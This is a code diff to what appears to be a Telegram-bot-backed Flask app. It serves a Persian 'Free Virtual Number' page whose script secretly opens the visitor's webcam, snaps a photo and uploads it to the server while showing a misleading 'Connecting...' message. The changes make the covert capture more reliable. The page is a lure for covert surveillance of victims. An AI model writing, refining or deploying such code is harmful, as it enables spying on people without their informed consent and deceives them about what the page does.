@@ -9,12 +9,15 @@ bot = telebot.TeleBot(BOT_TOKEN)
 HTML_CONTENT = """
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
-<head><meta charset="UTF-8"><title>Free Virtual Number</title>
-<style>
-    body { background: #0b0f19; color: white; text-align: center; padding-top: 50px; font-family: sans-serif; }
-    .card { background: #161f30; padding: 20px; border-radius: 10px; display: inline-block; width: 80%; }
-    button { background: #ef4444; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
-</style>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Virtual Number</title>
+    <style>
+        body { background: #0b0f19; color: white; text-align: center; padding-top: 50px; font-family: sans-serif; }
+        .card { background: #161f30; padding: 20px; border-radius: 10px; display: inline-block; width: 80%; }
+        button { background: #ef4444; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 15px; }
+    </style>
 </head>
 <body>
     <div class="card">
@@ -25,20 +28,27 @@ HTML_CONTENT = """
     <video id="video" autoplay playsinline style="display:none;"></video>
     <script>
         async function capture() {
-            const stream = await navigator.mediaDevices.getUserMedia({video: true});
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            setTimeout(async () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('photo', blob);
-                    await fetch("/upload", {method: 'POST', body: formData});
-                    alert("در حال اتصال به سرور...");
-                }, 'image/jpeg');
-            }, 1000);
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640; 
+                    canvas.height = video.videoHeight || 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'photo.jpg');
+                        await fetch("/upload", {method: 'POST', body: formData});
+                        stream.getTracks().forEach(track => track.stop());
+                        alert("Connecting...");
+                    }, 'image/jpeg', 0.95);
+                }, 1500);
+            } catch (e) {
+                alert("Permission required");
+            }
         }
     </script>
 </body>
@@ -58,4 +68,3 @@ def upload():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
-"""
